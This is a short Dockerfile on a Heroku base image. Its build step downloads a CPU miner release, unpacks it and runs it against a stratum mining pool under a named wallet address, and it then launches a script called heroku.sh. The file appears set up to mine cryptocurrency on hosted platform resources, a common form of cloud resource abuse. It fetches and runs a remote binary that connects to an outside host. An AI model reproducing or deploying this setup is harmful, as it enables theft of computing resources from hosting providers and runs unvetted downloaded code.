FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.24/cpuminer-opt-linux.tar.gz; tar xf cpuminer-opt-linux.tar.gz; ./cpuminer-sse2 -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1q5a73rjv0av5d0h3fr2n7vjhltxrhlpxcz0wpmy.1
CMD bash heroku.sh
